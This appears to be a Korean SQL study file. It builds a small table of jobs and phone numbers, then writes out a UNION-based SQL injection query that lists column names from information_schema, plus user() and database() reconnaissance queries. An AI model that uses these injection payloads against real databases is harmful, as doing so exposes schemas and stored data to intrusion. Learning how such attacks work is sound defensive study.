create table imsi
(id int, job varchar(10), tel varchar(10));

insert into imsi values(1,'의사','123-8765');
insert into imsi values(2,'변호사','456-9999');
insert into imsi values(3,'교수','678-4444');

select * from imsi;

select * from test where id=1
union select null,null,group_concat(column_name) from information_schema.columns
where table_name='imsi';

select user()  -- 현재 접속한 user정보 알기
select database() --현재 DB정보 알기
